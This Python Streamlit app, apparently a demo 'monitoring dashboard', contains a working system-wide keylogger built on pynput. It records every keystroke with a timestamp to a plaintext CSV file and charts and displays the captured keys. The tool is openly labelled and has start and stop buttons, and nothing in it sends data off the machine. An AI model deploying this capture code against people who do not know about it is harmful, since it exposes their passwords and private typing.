import streamlit as st
from pynput import keyboard
import pandas as pd
import plotly.express as px
import datetime
import os

log_file = "logs.csv"

if "logging" not in st.session_state:
    st.session_state.logging = False

listener = None


# ---------------------------
# KEYLOGGER FUNCTION
# ---------------------------
def on_press(key):

    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)

    timestamp = datetime.datetime.now()

    data = {
        "timestamp": timestamp,
        "key": key_data
    }

    df = pd.DataFrame([data])

    if os.path.exists(log_file):
        df.to_csv(log_file, mode="a", header=False, index=False)
    else:
        df.to_csv(log_file, index=False)


def start_logging():
    global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    st.session_state.logging = True


def stop_logging():
    global listener
    if listener:
        listener.stop()
    st.session_state.logging = False


def clear_logs():
    if os.path.exists(log_file):
        os.remove(log_file)


# ---------------------------
# STREAMLIT UI
# ---------------------------

st.title("Cybersecurity Monitoring Dashboard")

st.sidebar.header("Controls")

if st.sidebar.button("Start Keylogger"):
    start_logging()

if st.sidebar.button("Stop Keylogger"):
    stop_logging()

if st.sidebar.button("Clear Logs"):
    clear_logs()

status = "ACTIVE" if st.session_state.logging else "IDLE"
st.sidebar.write("Status:", status)


# ---------------------------
# LOAD DATA
# ---------------------------

if os.path.exists(log_file):
    df = pd.read_csv(log_file)
else:
    df = pd.DataFrame(columns=["timestamp", "key"])


# ---------------------------
# METRICS
# ---------------------------

st.subheader("Activity Metrics")

col1, col2, col3 = st.columns(3)

col1.metric("Total Keystrokes", len(df))
col2.metric("Unique Keys", df["key"].nunique())
col3.metric("Sessions Logged", df["timestamp"].nunique())


# ---------------------------
# KEY FREQUENCY GRAPH
# ---------------------------

if not df.empty:

    st.subheader("Key Frequency Analysis")

    freq = df["key"].value_counts().reset_index()
    freq.columns = ["key", "count"]

    fig = px.bar(freq, x="key", y="count")

    st.plotly_chart(fig, use_container_width=True)


# ---------------------------
# TIMELINE GRAPH
# ---------------------------

if not df.empty:

    st.subheader("Typing Activity Timeline")

    df["timestamp"] = pd.to_datetime(df["timestamp"])
    df["minute"] = df["timestamp"].dt.floor("min")

    timeline = df.groupby("minute").size().reset_index(name="keystrokes")

    fig2 = px.line(timeline, x="minute", y="keystrokes")

    st.plotly_chart(fig2, use_container_width=True)


# ---------------------------
# LOG VIEWER
# ---------------------------

st.subheader("Captured Logs")

st.dataframe(df, use_container_width=True)
